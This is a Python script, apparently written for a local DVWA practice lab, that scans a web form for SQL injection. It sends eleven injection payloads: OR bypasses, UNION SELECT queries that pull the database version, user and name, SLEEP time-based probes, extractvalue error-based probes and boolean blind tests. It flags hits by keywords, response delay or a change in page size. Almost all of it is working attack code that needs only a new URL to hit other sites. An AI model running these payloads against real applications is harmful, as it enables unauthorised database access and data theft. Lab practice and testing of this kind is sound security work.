#!/usr/bin/env python3

import requests
import sys
import time
from datetime import datetime

TARGET_URL = "http://127.0.0.1:42001/vulnerabilities/sqli/"

SESSION_COOKIE = {
    "PHPSESSID": "9e124456d84d6cd2cecb9df8d2f9c4d0",
    "security": "low"
}

PAYLOADS = [
    ("Basic OR bypass",          "1' OR '1'='1"),
    ("Always true",              "1' OR 1=1 --"),
    ("Comment bypass",           "1' --"),
    ("Union basic",              "1' UNION SELECT null,null --"),
    ("Union version",            "1' UNION SELECT null,version() --"),
    ("Union user",               "1' UNION SELECT null,user() --"),
    ("Union database",           "1' UNION SELECT null,database() --"),
    ("Time-based sleep",         "1' AND SLEEP(2) --"),
    ("Error-based",              "1' AND extractvalue(1,concat(0x7e,version())) --"),
    ("Blind true",               "1' AND 1=1 --"),
    ("Blind false",              "1' AND 1=2 --"),
]

SUCCESS_INDICATORS = [
    "first name", "surname", "admin", "mysql", 
    "warning", "error", "unknown column", 
    "sql", "information_schema"
]

def print_banner():
    print("-" * 60)
    print("SQL Injection Scanner")
    print(f"Target: {TARGET_URL}")
    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)

def get_baseline(session):
    try:
        resp = session.get(TARGET_URL, params={"id": "1", "Submit": "Submit"})
        return resp.text
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        sys.exit(1)

def is_vulnerable(response, baseline, elapsed, payload):
    response_lower = response.lower()

    for indicator in SUCCESS_INDICATORS:
        if indicator in response_lower:
            return True, f"Found: {indicator}"

    if "sleep" in payload.lower() and elapsed > 1.5:
        return True, f"Time-delay: {elapsed:.2f}s"

    if len(response) > 0 and abs(len(response) - len(baseline)) > 200:
        return True, f"Response shift ({len(response)} vs {len(baseline)})"

    return False, "Safe"

def scan(session, baseline):
    results = []
    vuln_count = 0

    print("[*] Running vulnerability checks...\n")

    for i, (name, payload) in enumerate(PAYLOADS, 1):
        print(f"[{i:02d}] {name}...")

        try:
            start = time.time()
            resp = session.get(
                TARGET_URL,
                params={"id": payload, "Submit": "Submit"},
                timeout=10
            )
            elapsed = time.time() - start

            vuln, reason = is_vulnerable(resp.text, baseline, elapsed, payload)

            if vuln:
                print(f"     [!] VULNERABLE: {reason}\n")
                vuln_count += 1
            else:
                print(f"     [-] Clear\n")

            results.append({
                "name": name,
                "payload": payload,
                "vulnerable": vuln,
                "reason": reason
            })

        except Exception as e:
            print(f"     [!] Error: {e}\n")

    return results, vuln_count

def print_summary(results, vuln_count):
    print("-" * 60)
    print(f"RESULTS: {vuln_count} Vulnerabilities Found")
    print("-" * 60)

    for r in results:
        if r["vulnerable"]:
            print(f"[*] {r['name']} ({r['reason']})")
    print("")

def main():
    print_banner()
    session = requests.Session()
    session.cookies.update(SESSION_COOKIE)

    baseline = get_baseline(session)
    results, vuln_count = scan(session, baseline)

    print_summary(results, vuln_count)

if __name__ == "__main__":
    main()